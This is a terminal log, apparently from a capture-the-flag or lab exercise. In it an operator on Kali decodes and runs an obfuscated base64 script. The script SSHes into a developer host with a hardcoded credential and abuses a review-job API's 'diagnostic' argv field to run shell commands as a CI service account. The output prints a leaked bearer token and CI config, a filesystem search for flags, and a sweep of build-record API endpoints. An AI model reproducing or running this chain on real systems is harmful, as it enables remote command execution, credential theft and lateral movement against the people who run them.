@@ -1,0 +1,126 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r44.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYgJ2Jhc2ggLXMnIDw8J1JFTU9URScKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkNSRUQ9J3Jvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nCmNhdCA+IC90bXAvazA5NGNtZC5zaCA8PCdFT1MnCnNldCArZQpEPSIke0ZJRUxETElOS19SVU5fRElSOi0vcnVuL2ZpZWxkbGluay1jaX0iCmVjaG8gIj09PSBidWlsZC1yZWNvcmRzLmN1cmwgKHJlZGFjdGVkKSA9PT0iCnNlZCAtRSAncy8oW0FhXXV0aG9yaXphdGlvbltePV0qPVtbOnNwYWNlOl1dKiI/W0EtWmEtel0rIClbQS1aYS16MC05Ll8tXSsvXDFSRURBQ1RFRC9nOyBzLyhbVHRdb2tlbltePV0qPVtbOnNwYWNlOl1dKiI/KVtBLVphLXowLTkuXy1dKy9cMVJFREFDVEVEL2cnICIkRC9idWlsZC1yZWNvcmRzLmN1cmwiCmVjaG8gIj09PSBmaWxlc3lzdGVtIGZsYWcvYnVpbGQgc2VhcmNoID09PSIKZ3JlcCAtUklsICJGTEFHeyIgL3NydiAvb3B0IC9ldGMgL3Vzci9sb2NhbCAvdmFyIC9ob21lIC9yb290IC9ydW4gL3RtcCAyPi9kZXYvbnVsbCB8IGhlYWQgLTUwCmZpbmQgLyAteGRldiBcKCAtaW5hbWUgJypidWlsZCpyZWNvcmQqJyAtbyAtaW5hbWUgJypydW5uZXIqb3BlcmF0aW9uKicgLW8gLWluYW1lICcqZmllbGRsaW5rLWNpKicgXCkgMj4vZGV2L251bGwgfCBoZWFkIC0xMDAKZWNobyAiPT09IGNvbm5lY3Rpb24gY2hlY2sgKyBjdXJyZW50IGlkcyA9PT0iCi4gIiREL2Nvbm5lY3Rpb25zLmVudiIKVT0iJEZJRUxETElOS19CVUlMRF9SRUNPUkRTX1VSTCIKT1VUPSQoY3VybCAtcSAtLXNpbGVudCAtLXNob3ctZXJyb3IgLS1mYWlsIC0tY29uZmlnICIkRC9idWlsZC1yZWNvcmRzLmN1cmwiIC0tdXJsICIkVS9hcGkvYnVpbGQtcmVjb3Jkcy93b3JrZXItc3RhdHVzIikKZWNobyAiJE9VVCIKUklEPSQoZWNobyAiJE9VVCIgfCBzZWQgLW4gJ3MvLioicmVxdWVzdF9pZCI6IlwoW14iXSpcKSIuKi9cMS9wJykKUlVOPSQoZWNobyAiJE9VVCIgfCBzZWQgLW4gJ3MvLioicnVuX2lkIjoiXChbXiJdKlwpIi4qL1wxL3AnKQplY2hvICJSSUQ9JFJJRCBSVU49JFJVTiIKZm9yIFAgaW4gIi9hcGkvYnVpbGQtcmVjb3Jkcy93b3JrZXItc3RhdHVzLyRSSUQiICIvYXBpL2J1aWxkLXJlY29yZHMvd29ya2VyLXN0YXR1cy8kUlVOIiAiL2FwaS9idWlsZC1yZWNvcmRzL3JlcXVlc3RzLyRSSUQiICIvYXBpL2J1aWxkLXJlY29yZHMvcmVjb3Jkcy8kUlVOIiAiL2FwaS9idWlsZC1yZWNvcmRzL2pvYnMvJFJVTiIgIi9hcGkvYnVpbGQtcmVjb3Jkcy8kUlVOIiAiL2FwaS9idWlsZC1yZWNvcmRzLyRSSUQiICIvYXBpL2J1aWxkLXJlY29yZHMvd29ya2VyLXN0YXR1cz9ydW5faWQ9JFJVTiIgIi9hcGkvYnVpbGQtcmVjb3Jkcy93b3JrZXItc3RhdHVzP3JlcXVlc3RfaWQ9JFJJRCIgIi9hcGkvYnVpbGQtcmVjb3Jkcy9yZWNvcmRzIiAiL2FwaS9idWlsZC1yZWNvcmRzL3JlY29yZHM/cnVuX2lkPSRSVU4iICIvYXBpL2J1aWxkLXJlY29yZHMvam9icz9ydW5faWQ9JFJVTiIgIi9hcGkvYnVpbGQtcmVjb3Jkcy9hcmNoaXZlcy8kUlVOIiAiL2FwaS9idWlsZC1yZWNvcmRzL3dvcmtlci1zdGF0dXMvY3VycmVudCIgIi9hcGkvYnVpbGQtcmVjb3Jkcy93b3JrZXItc3RhdHVzL3NlbGYiOyBkbwogIGVjaG8gIiMjIyBHRVQgJFAiCiAgY3VybCAtcSAtLXNpbGVudCAtLXNob3ctZXJyb3IgLS1jb25maWcgIiREL2J1aWxkLXJlY29yZHMuY3VybCIgLXcgIlxuW0hUVFAgJXtodHRwX2NvZGV9XVxuIiAtLXVybCAiJFUkUCIgMj4mMSB8IGhlYWQgLWMgMjAwMAogIGVjaG8KZG9uZQplY2hvICI9PT0gT1BUSU9OUyAvYXBpL2J1aWxkLXJlY29yZHMgPT09IgpjdXJsIC1xIC0tc2lsZW50IC0tc2hvdy1lcnJvciAtLWNvbmZpZyAiJEQvYnVpbGQtcmVjb3Jkcy5jdXJsIiAtaSAtWCBPUFRJT05TIC0tdXJsICIkVS9hcGkvYnVpbGQtcmVjb3JkcyIgMj4mMSB8IGhlYWQgLTQwCkVPUwpweXRob24zIC0gPDwnUFknCmltcG9ydCBqc29uCmNtZD1vcGVuKCcvdG1wL2swOTRjbWQuc2gnKS5yZWFkKCkKYm9keT17InN1cHBvcnRfaW5wdXQiOiJidWlsZG9wczovL3Jldmlld3MvZGlhZ25vc3RpYy1yZXF1ZXN0LXJlZmVyZW5jZUAzIiwiZGlhZ25vc3RpYyI6eyJwcm9maWxlIjoicnVubmVyLWNvbW1hbmQiLCJhcmd2IjpbIi9iaW4vc2giLCItYyIsY21kXX19Cm9wZW4oJy90bXAvazA5NGJvZHkuanNvbicsJ3cnKS53cml0ZShqc29uLmR1bXBzKGJvZHkpKQpQWQpSPSQoY3VybCAtc1MgLW0gMzAgLWdrIC0tY2FjZXJ0ICIkQ0EiIC11ICIkQ1JFRCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgQC90bXAvazA5NGJvZHkuanNvbiAiaHR0cHM6Ly9yZXZpZXcua2VwbGVyb3BzLnRlc3QvYXBpL3Jldmlldy1qb2JzIikKZWNobyAiUE9TVDogJFIiCko9JChlY2hvICIkUiIgfCBzZWQgLW4gJ3MvLioicnVuX2lkIjoiXChbXiJdKlwpIi4qL1wxL3AnKQppZiBbIC1uICIkSiIgXTsgdGhlbgogIGZvciBpIGluIDEgMiAzIDQgNSA2IDcgOCA5IDEwOyBkbwogICAgY3VybCAtc1MgLW0gMzAgLWdrIC0tY2FjZXJ0ICIkQ0EiIC11ICIkQ1JFRCIgImh0dHBzOi8vcmV2aWV3LmtlcGxlcm9wcy50ZXN0L2FwaS9yZXZpZXctam9icy8kSiIgPiAvdG1wL2swOTRyZXMuanNvbgogICAgZ3JlcCAtcSAnInN0YXRlIjoic3VjY2VzcyJcfCJzdGF0ZSI6ImZhaWxlZCJcfCJzdGF0ZSI6ImVycm9yIicgL3RtcC9rMDk0cmVzLmpzb24gJiYgYnJlYWsKICAgIHNsZWVwIDIKICBkb25lCiAgZWNobyAiPT09IFJFU1VMVCA9PT0iCiAgcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQganNvbgpkPWpzb24ubG9hZChvcGVuKCcvdG1wL2swOTRyZXMuanNvbicpKQpwcmludCgic3RhdGUiLGQuZ2V0KCJzdGF0ZSIpLCJleGl0IixkLmdldCgiZXhpdF9jb2RlIiksInJ1biIsZC5nZXQoInJ1bl9pZCIpKQpwcmludCgiU1RET1VUOlxuIitkLmdldCgic3Rkb3V0IiwiIikpCnByaW50KCJTVERFUlI6XG4iK2QuZ2V0KCJzdGRlcnIiLCIiKSkKUFkKZmkKUkVNT1RFCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r44.sh; bash /tmp/r44.sh; echo DONEMARK_1795208250514$((6*7))
+POST: {"result":"/api/review-jobs/RJ-7EC43B4F","run_id":"RJ-7EC43B4F"}
+=== RESULT ===
+state success exit 0 run RJ-7EC43B4F
+STDOUT:
+=== build-records.curl (redacted) ===
+resolve = "review.keplerops.test:443:127.0.0.1"
+cacert = /tmp/fieldkest-ca.crt
+insecure
+header = "Authorization: Bearer eyJhdWQiOiJmaWVsZGtlc3QtYnVpbGQtcmVjb3JkcyIsImV4cCI6MTc5NTIwODQ1NiwiaWF0IjoxNzk1MjA4Mjc2LCJqdGkiOiI2YzFmMzQyZS1hOWJlLTQ4MWItOWVjYy0yZWI0ODg0NWZiZTMiLCJsZWFzZV9pZCI6IjQ3NmQ2NGQzMjUzYjQ4NTY4ODAwMDk4MGJlZWZkMmRiIiwicHJpbmNpcGFsIjoic3ZjLWZpZWxkbGluay1jaSIsInJ1bl9pZCI6IlJKLTdFQzQzQjRGIn0.Zm3nR3OfQ20sdbRp05yNgByDNciHs0ovq2zIISoqMOw"
+=== filesystem flag/build search ===
+/opt/fieldkest/ci.py
+/opt/fieldkest-ci/ci.py
+/var/lib/fieldkest-handover/current.json
+/srv/fieldlink-ci
+/srv/fieldlink-ci/runner/runner-operations.md
+=== connection check + current ids ===
+{"availability":"available","principal":"svc-fieldlink-ci","request_id":"eabbe3e8-6740-42ab-94d5-7b6fe3b7d7b5","run_id":"RJ-7EC43B4F"}
+RID=eabbe3e8-6740-42ab-94d5-7b6fe3b7d7b5 RUN=RJ-7EC43B4F
+### GET /api/build-records/worker-status/eabbe3e8-6740-42ab-94d5-7b6fe3b7d7b5
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/worker-status/RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/requests/eabbe3e8-6740-42ab-94d5-7b6fe3b7d7b5
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/records/RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/jobs/RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/eabbe3e8-6740-42ab-94d5-7b6fe3b7d7b5
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/worker-status?run_id=RJ-7EC43B4F
+{"availability":"available","principal":"svc-fieldlink-ci","request_id":"38a110f1-56d1-4a45-98c0-c87248d3f282","run_id":"RJ-7EC43B4F"}
+
+[HTTP 200]
+
+### GET /api/build-records/worker-status?request_id=eabbe3e8-6740-42ab-94d5-7b6fe3b7d7b5
+{"availability":"available","principal":"svc-fieldlink-ci","request_id":"96b3395a-7f44-417e-b039-126100f00778","run_id":"RJ-7EC43B4F"}
+
+[HTTP 200]
+
+### GET /api/build-records/records
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/records?run_id=RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/jobs?run_id=RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/archives/RJ-7EC43B4F
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/worker-status/current
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+### GET /api/build-records/worker-status/self
+{"error":"authentication_required"}
+
+[HTTP 401]
+
+=== OPTIONS /api/build-records ===
+HTTP/1.1 501 Unsupported method ('OPTIONS')
+Server: FieldKest/1.0 Python/3.12.11
+Date: Fri, 20 Nov 2026 20:57:59 GMT
+Connection: close
+Content-Type: text/html;charset=utf-8
+Content-Length: 360
+
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>Error response</title>
+    </head>
+    <body>
+        <h1>Error response</h1>
+        <p>Error code: 501</p>
+        <p>Message: Unsupported method ('OPTIONS').</p>
+        <p>Error code explanation: 501 - Server does not support this operation.</p>
+    </body>
+</html>
+
+STDERR:
+
